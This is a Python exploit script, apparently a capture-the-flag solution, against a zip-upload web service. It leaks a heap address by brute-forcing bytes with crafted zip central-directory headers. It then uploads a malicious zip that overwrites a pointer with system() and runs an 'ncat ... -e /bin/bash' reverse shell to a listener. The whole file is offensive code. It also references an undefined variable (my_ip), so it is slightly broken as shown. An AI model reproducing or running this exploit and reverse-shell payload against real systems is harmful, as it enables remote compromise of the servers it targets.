import requests
import struct
import zipfile


##############
# PARAMETERS #
##############

# Victim params
ip = "127.0.0.1"
port = 5000
url = f"http://{ip}:{port}/upload"

# Reverse shell params
ip = "127.0.0.1"
my_port = 9001


#############
# LEAK ASLR #
#############

guess = 0
leak = b""

size_chunk = 0x20
off_data = size_chunk * 2

stored_block_lfh = b'PK\x03\x04\n\x00\x00\x00\x00\x00\xd2\xbb[X\xday\xa1\xa7\x04\x00\x00\x00\x04\x00\x00\x00\x05\x00\x1c\x00dummyUT\t\x00\x03\x8cb\xdee\x8cb\xdeeux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x009\t\xb4\x13'
stored_block_cd = b'PK\x01\x02\x1e\x03\n\x00\x00\x00\x00\x00\xd2\xbb[X\xday\xa1\xa7\x04\x00\x00\x00\x04\x00\x00\x00\x05\x00\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa4\x81\x00\x00\x00\x00dummyUT\x05\x00\x03\x8cb\xdeeux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00'

cd = b"PK\x01\x02\x1e\x03\n\x00\x00\x00\x00\x00C\x8a[X\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00%b\x18\x00%b\x00\x00\x00\x00\x00\x00\xa4\x81%blinpeas.shUT\x05\x00\x03>\x0b\xdeeux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00"
eocd = b"PK\x05\x06\x00\x00\x00\x00\x80\x00%b%b%b\x00\x00"

lencd = len(cd % (b"00", b"00", b"0000"))
leneocd = len(eocd % (b"00", b'0000', b'0000'))

totsize = len(stored_block_lfh) 
totsize += len(stored_block_cd) 
totsize += lencd
totsize += leneocd
totsize += 8  # metadata of heap chunk
while totsize & 0xf != 0:
    totsize += 1

off_data += totsize  # offset to the beg of "data"
off_data -= 0x18     # ajust to the beg of data.filename

print(f"{hex(size_chunk)=}\n{hex(off_data)=}")

for _ in range(8):
    off_data += 1

    for guess in range(0x100):
        # Add a classical stored block to put the free address on the heap
        zip = stored_block_lfh
        zip += stored_block_cd

        # generate payload for the size and inject malicious cdh
        payload = (guess << 8)
        if len(leak):
            payload += leak[0]

        comp = (0x1000a - payload) % 0x10000
        zip += cd % (struct.pack("H", payload), struct.pack("H", comp), struct.pack("I", off_data))

        # Add EOCD
        zip += eocd % (
            struct.pack("H", 2),
            struct.pack("I", lencd + len(stored_block_cd)), 
            struct.pack("I", len(stored_block_lfh))
            )

        x = requests.post(url, files={'file': zip})
        if "Error" not in x.text:
            print("Found correct guess:", hex(guess))
            leak = guess.to_bytes(1, "big") + leak

    print(leak)

leak_i = 0
for i in range(8):
    leak_i += leak[7-i] << (i*8)

print(hex(leak_i))


#######################
# Craft malicious zip #
#######################

l = 96
offset = -0x54670
free = leak_i

system = struct.pack("Q", free + offset)
command = b"ncat %b %b -e /bin/bash\x00" % (my_ip.encode(), str(my_port).encode())

payload = command + b"a" * (l - len(command)) + b"\x00"*4 + system

with zipfile.ZipFile("payload.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
    with zipf.open("payload.txt", "w") as f:
        f.write(payload)
        f.close()

    for i in range(1, 8):
        with zipf.open(f"dummy{str(i)}.txt", "w") as f:
            f.write(b"dummy")
            f.close()

    zipf.close()

zip = b""
with open("payload.zip", "rb") as zipf:
    zip = zipf.read()
    zipf.close()

off = zip.find(bytes([len(payload)]))
print("Offset of payload size: " + hex(off))

zip = zip[:off] + b"\x24" + zip[off+1:]

with open("payload.zip", "wb") as zipf:
    zipf.write(zip)
    zipf.close()

print("payload.zip patched")
print("You can start listening on port ", str(my_port))
input("Press any key when you are ready...")
print("Sending payload...")

x = requests.post(url, files={'file': zip})
print(x.text)